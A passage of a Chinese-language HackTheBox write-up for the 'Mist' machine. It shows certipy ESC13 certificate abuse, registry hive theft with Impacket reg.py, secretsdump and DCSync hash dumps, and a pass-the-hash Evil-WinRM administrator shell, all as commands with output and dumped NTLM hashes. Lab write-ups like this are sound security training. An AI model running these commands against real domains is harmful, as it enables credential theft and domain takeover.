<li>使用该证书获取Kerberos票据。</li>
<li>使用Kerberos票据对DC01进行身份验证，并使用Backup Operators特权退出注册表组。</li>
<li>本地secretsdump.py为DC01提取哈希值。</li>
<li>使用管理员NTLM在DC01上获取shell。</li>
</ul>
<p>虽然上面我使用certipy的分支来识别ESC13<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NwbG91dGNoeS9DZXJ0aXB5L3RyZWUvbWFpbg==">Certipy ESC13<i class="fa fa-external-link-alt"></i></span>，但当前版本可以执行利用它所需的所有步骤。</p>
<h3 id="访问证书管理器组"><a href="#访问证书管理器组" class="headerlink" title="访问证书管理器组"></a>访问证书管理器组</h3><p>首先使用ManagerAuthentication模板获取svc_cabackup的证书。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/mist proxychains -q certipy req -u svc_cabackup -hashes :c9872f1bc10bdd522c12fc2ac9041b64 -ca mist-DC01-CA -template ManagerAuthentication -dc-ip 192.168.100.100 -dns 192.168.100.100 -key-size 4096</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 63</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;svc_cabackup@mist.htb&#x27;</span></span><br><span class="line">[*] Certificate object SID is <span class="string">&#x27;S-1-5-21-1045809509-3006658589-2426055941-1135&#x27;</span></span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;svc_cabackup.pfx&#x27;</span></span><br></pre></td></tr></table></figure>

<p>现在，使用该证书获取Kerberos票据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/mist proxychains -q certipy auth -pfx ./svc_cabackup.pfx -kirbi -dc-ip 192.168.100.100</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: svc_cabackup@mist.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved Kirbi file to <span class="string">&#x27;svc_cabackup.kirbi&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup@mist.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64</span><br></pre></td></tr></table></figure>

<p>将该票据转换为可以在Linux上使用的缓存格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/mist ticketConverter.py svc_cabackup.kirbi svc_cabackup.ccache</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] converting kirbi to ccache...</span><br><span class="line">[+] <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="访问ServiceAccounts组"><a href="#访问ServiceAccounts组" class="headerlink" title="访问ServiceAccounts组"></a>访问ServiceAccounts组</h3><p>使用Kerberos 配合BackupSvcAuthentication template进行认证</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/mist KRB5CCNAME=svc_cabackup.ccache proxychains -q certipy req -u svc_cabackup -k -no-pass -ca mist-DC01-CA -template BackupSvcAuthentication -dc-ip 192.168.100.100 -dns 192.168.100.100 -key-size 4096 -target DC01.mist.htb</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 64</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;svc_cabackup@mist.htb&#x27;</span></span><br><span class="line">[*] Certificate object SID is <span class="string">&#x27;S-1-5-21-1045809509-3006658589-2426055941-1135&#x27;</span></span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;svc_cabackup.pfx&#x27;</span></span><br></pre></td></tr></table></figure>

<p>使用certipy auth来获得一张ticket。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/mist proxychains -q certipy auth -pfx ./svc_cabackup.pfx -kirbi -dc-ip 192.168.100.100</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: svc_cabackup@mist.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved Kirbi file to <span class="string">&#x27;svc_cabackup.kirbi&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;svc_cabackup@mist.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64</span><br></pre></td></tr></table></figure>

<p>ticketConverter.py转换它：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/mist ticketConverter.py svc_cabackup.kirbi svc_cabackup.ccache</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] converting kirbi to ccache...</span><br><span class="line">[+] <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h2 id="Recover-Hashes"><a href="#Recover-Hashes" class="headerlink" title="Recover Hashes"></a>Recover Hashes</h2><h3 id="Exfil-Reg-Hives"><a href="#Exfil-Reg-Hives" class="headerlink" title="Exfil Reg Hives"></a>Exfil Reg Hives</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyZUF1dGhDb3JwL2ltcGFja2V0">Impacket<i class="fa fa-external-link-alt"></i></span>有一个reg.py示例脚本，其中有一个备份子命令，可将HKLM\SAM，HKLM\SYSTEM和HKLM\SECURITY保存到系统上的指定位置。这里的一种常用技术是将hive直接保存到我控制的SMB共享中，但是代理链上的网络连接很慢而且很挑剔，所以最好将它们保存到C:\programdata\：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/mist KRB5CCNAME=svc_cabackup.ccache proxychains -q reg.py -k -no-pass mist.htb/svc_cabackup@dc01.mist.htb backup -o <span class="string">&#x27;\programdata&#x27;</span></span><br><span class="line">/usr/local/bin/reg.py:195: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\S&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> hive <span class="keyword">in</span> [<span class="string">&quot;HKLM\SAM&quot;</span>, <span class="string">&quot;HKLM\SYSTEM&quot;</span>, <span class="string">&quot;HKLM\SECURITY&quot;</span>]:</span><br><span class="line">/usr/local/bin/reg.py:195: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\S&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> hive <span class="keyword">in</span> [<span class="string">&quot;HKLM\SAM&quot;</span>, <span class="string">&quot;HKLM\SYSTEM&quot;</span>, <span class="string">&quot;HKLM\SECURITY&quot;</span>]:</span><br><span class="line">/usr/local/bin/reg.py:195: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\S&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> hive <span class="keyword">in</span> [<span class="string">&quot;HKLM\SAM&quot;</span>, <span class="string">&quot;HKLM\SYSTEM&quot;</span>, <span class="string">&quot;HKLM\SECURITY&quot;</span>]:</span><br><span class="line">/usr/local/bin/reg.py:220: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\%&#x27;</span></span><br><span class="line">  outputFileName = <span class="string">&quot;%s\%s.save&quot;</span> % (self.__options.outputPath, subKey)</span><br><span class="line">/usr/local/bin/reg.py:221: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\S&#x27;</span></span><br><span class="line">  logging.debug(<span class="string">&quot;Dumping %s, be patient it can take a while for large hives (e.g. HKLM\SYSTEM)&quot;</span> % keyName)</span><br><span class="line">/usr/local/bin/reg.py:597: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\s&#x27;</span></span><br><span class="line">  save_parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, dest=<span class="string">&#x27;outputPath&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, metavar=<span class="string">&#x27;\\\\192.168.0.2\share&#x27;</span>, required=True, <span class="built_in">help</span>=<span class="string">&#x27;Output UNC path the target system must export the registry saves to&#x27;</span>)</span><br><span class="line">/usr/local/bin/reg.py:600: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\S&#x27;</span></span><br><span class="line">  backup_parser = subparsers.add_parser(<span class="string">&#x27;backup&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;(special command) Backs up HKLM\SAM, HKLM\SYSTEM and HKLM\SECURITY to a specified file.&#x27;</span>)</span><br><span class="line">/usr/local/bin/reg.py:601: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\s&#x27;</span></span><br><span class="line">  backup_parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, dest=<span class="string">&#x27;outputPath&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, metavar=<span class="string">&#x27;\\\\192.168.0.2\share&#x27;</span>, required=True,</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...</span><br><span class="line">[*] Saved HKLM\SAM to \programdata\SAM.save</span><br><span class="line">[*] Saved HKLM\SYSTEM to \programdata\SYSTEM.save</span><br><span class="line">[*] Saved HKLM\SECURITY to \programdata\SECURITY.save</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; <span class="built_in">ls</span> *.save</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\programdata</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        10/27/2024   2:04 AM          28672 SAM.save</span><br><span class="line">-a----        10/27/2024   2:04 AM          36864 SECURITY.save</span><br><span class="line">-a----        10/27/2024   2:04 AM       18210816 SYSTEM.save</span><br></pre></td></tr></table></figure>

<p>然后下载这3个文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; download SAM.save</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\programdata\SAM.save to SAM.save</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; download SECURITY.save</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\programdata\SECURITY.save to SECURITY.save</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil-WinRM* PS C:\programdata&gt; download SYSTEM.save</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\programdata\SYSTEM.save to SYSTEM.save</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>

<h3 id="secretsdump-1"><a href="#secretsdump-1" class="headerlink" title="secretsdump"></a>secretsdump</h3><p>Secretsdump.py将从这些hives中转储hash：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/mist secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save <span class="built_in">local</span></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x47c7c97d3b39b2a20477a77d25153da5</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e121bd371bd4bbaca21175947013dd7:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction <span class="keyword">for</span> user WDAGUtilityAccount failed. The account doesn<span class="string">&#x27;t have hash information.</span></span><br><span class="line"><span class="string">[*] Dumping cached domain logon information (domain/username:hash)</span></span><br><span class="line"><span class="string">[*] Dumping LSA Secrets</span></span><br><span class="line"><span class="string">[*] $MACHINE.ACC</span></span><br><span class="line"><span class="string">$MACHINE.ACC:plain_password_hex:c68cb851aa6312ad86b532db8103025cb80e69025bd381860316ba55b056b9e1248e7817ab7fc5b23c232a5bd2aa5b8515041dc3dc47fa4e2d4c34c7db403c7edc4418cf22a1b8c2c544c464ec9fedefb1dcdbebff68c6e9a103f67f3032b68e7770b4e8e22ef05b29d002cc0e22ad4873a11ce9bac40785dcc566d38bb3e2f0d825d2f4011b566ccefdc55f098c3b76affb9a73c6212f69002655dd7b774673bf8eecaccd517e9550d88e33677ceba96f4bc273e4999bbd518673343c0a15804c43fde897c9bd579830258b630897e79d93d0c22edc2f933c7ec22c49514a2edabd5d546346ce55a0833fc2d8403780</span></span><br><span class="line"><span class="string">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260</span></span><br><span class="line"><span class="string">[*] DPAPI_SYSTEM</span></span><br><span class="line"><span class="string">dpapi_machinekey:0xc78bf46f3d899c3922815140240178912cb2eb59</span></span><br><span class="line"><span class="string">dpapi_userkey:0xc62a01b328674180712ffa554dd33d468d3ad7b8</span></span><br><span class="line"><span class="string">[*] NL$KM</span></span><br><span class="line"><span class="string"> 0000   C4 C5 BF 4E A9 98 BD 1B  77 0E 76 A1 D3 09 4C AB   ...N....w.v...L.</span></span><br><span class="line"><span class="string"> 0010   B6 95 C7 55 E8 5E 4C 48  55 90 C0 26 19 85 D4 C2   ...U.^LHU..&amp;....</span></span><br><span class="line"><span class="string"> 0020   67 D7 76 64 01 C8 61 B8  ED D6 D1 AF 17 5E 3D FC   g.vd..a......^=.</span></span><br><span class="line"><span class="string"> 0030   13 E5 4D 46 07 5F 2B 67  D3 53 B7 6F E6 B6 27 31   ..MF._+g.S.o..&#x27;</span>1</span><br><span class="line">NL<span class="variable">$KM</span>:c4c5bf4ea998bd1b770e76a1d3094cabb695c755e85e4c485590c0261985d4c267d7766401c861b8edd6d1af175e3dfc13e54d46075f2b67d353b76fe6b62731</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<h3 id="二次secretsdump"><a href="#二次secretsdump" class="headerlink" title="二次secretsdump"></a>二次secretsdump</h3><p>这些本地哈希值不足以在系统上进行远程登录。然而，DC01$的system hash可以请求hash，因为它使用DCSync协议，而DCSync协议不是远程登录。这意味着可以使用machine hash执行远程secretsdump.py：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$MACHINE</span>.ACC: aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260</span><br><span class="line"></span><br><span class="line">~/hackthebox/machine/mist proxychains -q secretsdump.py <span class="string">&#x27;DC01$@DC01&#x27;</span> -hashes :e768c4cf883a87ba9e96278990292260 -just-dc-ntlm</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:b46782b9365344abdff1a925601e0385:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:298fe98ac9ccf7bd9e91a69b8c02e86f:::</span><br><span class="line">Sharon.Mullard:1109:aad3b435b51404eeaad3b435b51404ee:1f806175e243ed95db55c7f65edbe0a0:::</span><br><span class="line">Brandon.Keywarp:1110:aad3b435b51404eeaad3b435b51404ee:db03d6a77a2205bc1d07082740626cc9:::</span><br><span class="line">Florence.Brown:1111:aad3b435b51404eeaad3b435b51404ee:9ee69a8347d91465627365c41214edd6:::</span><br><span class="line">Jonathan.Clinton:1112:aad3b435b51404eeaad3b435b51404ee:165fbae679924fc539385923aa16e26b:::</span><br><span class="line">Markus.Roheb:1113:aad3b435b51404eeaad3b435b51404ee:74f1d3e2e40af8e3c2837ba96cc9313f:::</span><br><span class="line">Shivangi.Sumpta:1114:aad3b435b51404eeaad3b435b51404ee:4847f5daf1f995f14c262a1afce61230:::</span><br><span class="line">Harry.Beaucorn:1115:aad3b435b51404eeaad3b435b51404ee:a3188ac61d66708a2bd798fa4acca959:::</span><br><span class="line">op_Sharon.Mullard:1122:aad3b435b51404eeaad3b435b51404ee:d25863965a29b64af7959c3d19588dd7:::</span><br><span class="line">op_Markus.Roheb:1123:aad3b435b51404eeaad3b435b51404ee:73e3be0e5508d1ffc3eb57d48b7b8a92:::</span><br><span class="line">svc_smb:1125:aad3b435b51404eeaad3b435b51404ee:1921d81fdbc829e0a176cb4891467185:::</span><br><span class="line">svc_cabackup:1135:aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64:::</span><br><span class="line">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260:::</span><br><span class="line">MS01$:1108:aad3b435b51404eeaad3b435b51404ee:25231b945c930613cd0a425c85901ad4:::</span><br><span class="line">svc_ca$:1124:aad3b435b51404eeaad3b435b51404ee:07bb1cde74ed154fcec836bc1122bdcc:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<h2 id="DC01-administrator-Shell"><a href="#DC01-administrator-Shell" class="headerlink" title="DC01 administrator Shell"></a>DC01 administrator Shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">~/hackthebox/machine/mist proxychains -q evil-winrm -i DC01 -u administrator -H b46782b9365344abdff1a925601e0385</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">mist\administrator</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cat</span> C:\Users\Administrator\desktop\root.txt</span><br><span class="line">f8421360aaef98e99fa81ea80fb4a2ca</span><br></pre></td></tr></table></figure>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="253 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="253 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>253
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2024/10/27/mist/" title="HackTheBox Mist [CVE-2024-9405 + PetitPotam Attack + shadow credential + s4u impersonat + reading GMSA password + abusing AddKeyCredentialLink + exploiting ADCS ESC 13 twice]">https://fdlucifer.github.io/2024/10/27/mist/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/DC/" rel="tag"><i class="fa fa-tag"></i> DC</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/04/22/grafana-sql-injection/" rel="prev" title="Grafana backend sql injection affected all version">
                  <i class="fa fa-chevron-left"></i> Grafana backend sql injection affected all version
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/11/10/blazorized/" rel="next" title="HackTheBox Blazorized [WriteSPN Kerberoasting + DC session pirvesc + DCSync hash dump + Bloodhound-CE]">
                  HackTheBox Blazorized [WriteSPN Kerberoasting + DC session pirvesc + DCSync hash dump + Bloodhound-CE] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">253</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">667k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">40:24</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
